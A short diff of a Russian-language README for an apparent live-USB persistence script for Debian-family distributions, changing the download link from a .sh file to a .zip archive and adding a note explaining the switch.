@@ -8,7 +8,8 @@
 А также любых live дистребутивав семейства debian. Возможно сработает и над других live дистрибутивах.
 
 ## как использовать.
-[скачайте скрипт](https://github.com/jaroslavmedvedev2010-spec/scaly-Linex/raw/refs/heads/main/persistence.sh)
+[скачайте скрипт](https://github.com/jaroslavmedvedev2010-spec/scaly-Linex/raw/refs/heads/main/persistence.zip )
+("если што там архив просто по другому скачать по ссылке не получется")
 
   запишите iso образ на флешку спомащью dd в терминале или спомощью руфус, также в режыме dd.
   А затем актевируйте скрипт.
